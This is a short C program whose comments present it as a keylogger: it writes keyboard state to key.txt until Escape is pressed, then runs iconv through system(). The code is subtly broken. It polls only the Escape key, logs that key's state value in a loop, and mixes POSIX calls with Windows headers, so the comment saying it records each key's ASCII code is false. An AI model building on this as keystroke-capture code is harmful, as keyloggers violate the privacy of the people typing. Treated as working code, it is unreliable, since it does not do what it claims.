#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <windows.h>

int main()
{
    // open the key.txt file for writing
    int fd = open("key.txt", O_WRONLY | O_CREAT, 0644);
    if (fd == -1)
    {
        perror("open");
        exit(1);
    }

    // loop until the user presses the escape key
    while (1)
    {
        // get the state of the keyboard
        short keystate = GetAsyncKeyState(VK_ESCAPE);

        // check if the escape key is being pressed
        if (keystate & 0x8000)
        {
            break;
        }

        // write the ASCII code of the key to the file
        dprintf(fd, "%d\n", keystate);
    }

    // close the file
    close(fd);

    // convert the key.txt file to UTF-8
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "iconv -f ascii -t utf-8 key.txt -o key-utf8.txt");
    system(cmd);

    return 0;
}